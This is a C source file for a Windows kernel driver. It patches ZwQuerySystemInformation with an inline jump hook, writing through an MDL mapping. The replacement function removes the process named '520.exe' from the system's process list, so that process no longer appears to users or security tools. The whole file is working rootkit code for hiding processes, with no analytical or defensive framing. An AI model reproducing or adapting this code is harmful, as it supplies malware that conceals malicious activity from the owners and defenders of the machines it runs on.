#include "InlineHook.h"
#include "SSDTFunction.h"


// Inline Hook
BOOLEAN InlineHook()
{
	PVOID pSSDTFunctionAddress = NULL;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulDataSize = SIZE_SHELLCODE;
	UCHAR pData[SIZE_SHELLCODE] = { 0xe9, 0, 0, 0, 0 };
	LONG lOffset = 0;

	pSSDTFunctionAddress = GetSSDTFunction("ZwQuerySystemInformation");
	if (NULL == pSSDTFunctionAddress)
	{
		DbgPrint("GetSSDTFunction Error!\n");
		return FALSE;
	}
	pMdl = MmCreateMdl(NULL, pSSDTFunctionAddress, ulDataSize);
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}

	lOffset = (LONG)((PUCHAR)New_ZwQuerySystemInformation - (PUCHAR)pSSDTFunctionAddress - 5);
	RtlCopyMemory((PVOID)((PUCHAR)pData + 1), &lOffset, sizeof(lOffset));

	RtlCopyMemory(g_pOldData, pNewAddress, ulDataSize);

	RtlCopyMemory(pNewAddress, pData, ulDataSize);

	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);
	
	return TRUE;
}


// Inline Unhook
BOOLEAN InlineUnhook()
{
	PVOID pSSDTFunctionAddress = NULL;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulDataSize = SIZE_SHELLCODE;

	pSSDTFunctionAddress = GetSSDTFunction("ZwQuerySystemInformation");
	if (NULL == pSSDTFunctionAddress)
	{
		DbgPrint("GetSSDTFunction Error!\n");
		return FALSE;
	}
	pMdl = MmCreateMdl(NULL, pSSDTFunctionAddress, ulDataSize);
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}
	RtlCopyMemory(pNewAddress, g_pOldData, ulDataSize);

	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);

	return TRUE;
}


NTSTATUS New_ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
)
{
	NTSTATUS status = STATUS_SUCCESS;
	PSYSTEM_PROCESS sysProcess = NULL;
	PSYSTEM_PROCESS preProcess = NULL;
	UNICODE_STRING ustrHideProcessName;
	typedef NTSTATUS(*typedef_ZwQuerySystemInformation)(
		IN ULONG SystemInformationClass,
		IN PVOID SystemInformation,
		IN ULONG SystemInformationLength,
		OUT PULONG ReturnLength);

	typedef_ZwQuerySystemInformation pSSDTFunctionAddress = (typedef_ZwQuerySystemInformation)GetSSDTFunction("ZwQuerySystemInformation");
	if (NULL == pSSDTFunctionAddress)
	{
		DbgPrint("GetSSDTFunction Error!\n");
		return FALSE;
	}

	// Unhook
	InlineUnhook();

	status = pSSDTFunctionAddress(SystemInformationClass,
						SystemInformation,
						SystemInformationLength,
						ReturnLength);

	// Hook
	InlineHook();

	if (!NT_SUCCESS(status))
	{
		return status;
	}
	if (5 != SystemInformationClass)
	{
		return status;
	}

	RtlInitUnicodeString(&ustrHideProcessName, L"520.exe");
	sysProcess = (PSYSTEM_PROCESS)SystemInformation;
	preProcess = sysProcess;
	while (sysProcess->NextEntryDelta)
	{
		DbgPrint("[%d]%wZ\n", sysProcess->ProcessId, &sysProcess->ProcessName);
		if (RtlEqualUnicodeString(&sysProcess->ProcessName, &ustrHideProcessName, TRUE))
		{
			preProcess->NextEntryDelta = preProcess->NextEntryDelta + sysProcess->NextEntryDelta;
			DbgPrint("Hide %wZ Process OK.\n", &ustrHideProcessName);
			break;
		}
		preProcess = sysProcess;
		sysProcess = (PSYSTEM_PROCESS)((PUCHAR)sysProcess + sysProcess->NextEntryDelta);
	}

	return status;
}